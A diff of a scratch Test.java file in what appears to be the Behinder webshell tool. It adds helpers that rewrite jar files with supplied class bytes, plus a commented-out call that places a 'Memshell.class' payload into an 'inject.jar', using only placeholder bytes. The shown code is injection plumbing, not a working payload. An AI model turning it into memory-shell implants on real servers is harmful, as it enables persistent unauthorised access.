@@ -1,18 +1,25 @@
 package net.rebeyond.behinder.ui;
 
+import com.sun.tools.attach.VirtualMachine;
+import com.sun.tools.attach.spi.AttachProvider;
+import javassist.CannotCompileException;
+import javassist.NotFoundException;
 import net.rebeyond.behinder.utils.Utils;
 
-import java.io.File;
+import java.io.*;
 import java.lang.management.ManagementFactory;
 import java.lang.reflect.Method;
 import java.net.Socket;
+import java.net.URI;
 import java.net.URL;
 import java.nio.channels.SocketChannel;
-import java.nio.file.LinkOption;
-import java.nio.file.Path;
+import java.nio.file.*;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
-import java.util.Random;
+import java.util.*;
+import java.util.jar.JarEntry;
+import java.util.jar.JarFile;
+import java.util.jar.JarOutputStream;
 
 public class Test {
     private SocketChannel socketChannel;
@@ -60,6 +67,7 @@ public class Test {
 
 
     }
+    static native void sendQuitTo(int var0) throws IOException;
     public static String getFileType(String fileName)
     {
         int extIndex=fileName.lastIndexOf(".");
@@ -71,14 +79,113 @@ public class Test {
         String pid = name.split("@")[0];
         return pid;
     }
-    public static void main(String[] args) throws Exception {
+    private static void modifyJar(String pathToJAR, String pathToClassInsideJAR, byte[] classBytes) throws IOException, CannotCompileException, NotFoundException {
+        //REQUIRES JAVASSIST
 
-        String cmd="java14 --module-path \"/Users/rebeyond/lib\" --add-modules=javafx.controls --add-modules=javafx.fxml --add-modules=javafx.base --add-modules=javafx.graphics --add-modules=javafx.web -jar /Users/rebeyond/Behinder.jar";
-        //System.out.println(cmd);
-        Runtime.getRuntime().exec(new String[]{"bash","-c",cmd});
+        String classFileName = pathToClassInsideJAR.replace("\\", "/").substring(0, pathToClassInsideJAR.lastIndexOf('/'));
+        FileOutputStream fos=new FileOutputStream(classFileName,false );
+        fos.write(classBytes);
+        fos.flush();
+        fos.close();
+        Map<String, String> launchenv = new HashMap<>();
+        URI launchuri = URI.create("jar:"+new File(pathToJAR).toURI());
+        launchenv.put("create", "true");
+        try (FileSystem zipfs = FileSystems.newFileSystem(launchuri, launchenv)) {
+            Path externalClassFile = Paths.get(classFileName);
+            Path pathInJarfile = zipfs.getPath(pathToClassInsideJAR);
+            // copy a file into the zip file
 
-
+            Files.copy( externalClassFile,pathInJarfile,
+                    StandardCopyOption.REPLACE_EXISTING );
+        }
     }
+    public static void updateJarFile(File srcJarFile, String targetFilePath,boolean update, byte[] classBytes) throws IOException {
+
+        File tmpJarFile = File.createTempFile("tempJar", ".tmp");
+        JarFile jarFile = new JarFile(srcJarFile);
+        boolean jarUpdated = false;
+        List<String> fileNames = new ArrayList<String>();
+
+        try {
+            JarOutputStream tempJarOutputStream = new JarOutputStream(new FileOutputStream(tmpJarFile));
+            try {
+
+                        JarEntry entryx = new JarEntry(targetFilePath);
+                        fileNames.add(entryx.getName());
+                        tempJarOutputStream.putNextEntry(entryx);
+                        tempJarOutputStream.write(classBytes);
+
+
+
+                // Copy original jar file to the temporary one.
+                Enumeration<?> jarEntries = jarFile.entries();
+                while (jarEntries.hasMoreElements()) {
+                    JarEntry entry = (JarEntry) jarEntries.nextElement();
+                    /*
+                     * Ignore classes from the original jar which are being
+                     * replaced
+                     */
+                    String[] fileNameArray = (String[]) fileNames
+                            .toArray(new String[0]);
+                    Arrays.sort(fileNameArray);// required for binary search
+                    if (Arrays.binarySearch(fileNameArray, entry.getName()) < 0) {
+                        InputStream entryInputStream = jarFile
+                                .getInputStream(entry);
+                        tempJarOutputStream.putNextEntry(entry);
+                        byte[] buffer = new byte[1024];
+                        int bytesRead = 0;
+                        while ((bytesRead = entryInputStream.read(buffer)) != -1) {
+                            tempJarOutputStream.write(buffer, 0, bytesRead);
+                        }
+                    } else if (!update) {
+                        throw new IOException(
+                                "Jar Update Aborted: Entry "
+                                        + entry.getName()
+                                        + " could not be added to the jar"
+                                        + " file because it already exists and the update parameter was false");
+                    }
+                }
+
+                jarUpdated = true;
+            } catch (Exception ex) {
+                System.err.println("Unable to update jar file");
+                tempJarOutputStream.putNextEntry(new JarEntry("stub"));
+            } finally {
+                tempJarOutputStream.close();
+            }
+
+        } finally {
+            jarFile.close();
+            // System.out.println(srcJarFile.getAbsolutePath() + " closed.");
+
+            if (!jarUpdated) {
+                tmpJarFile.delete();
+            }
+        }
+
+        if (jarUpdated) {
+            srcJarFile.delete();
+            tmpJarFile.renameTo(srcJarFile);
+            // System.out.println(srcJarFile.getAbsolutePath() + " updated.");
+        }
+    }
+    /*public static void main(String[] args) throws Exception {
+
+        //modifyJar("/Users/rebeyond/inject.jar","Memshell.class/","test".getBytes());
+        updateJarFile(new File("/Users/rebeyond/inject.jar"),"net/rebeyond/payload/java/Memshell.class",true,"test".getBytes());
+    }*/
+
+
+        public static void main(String [] args) throws Throwable {
+
+
+
+            //String[] s=new String[]{"aaa","bbb","ccc"};
+            List s=new ArrayList();
+
+
+        }
+
     private static String getParentPath(String currentPath)
     {
         String parentPath=currentPath;
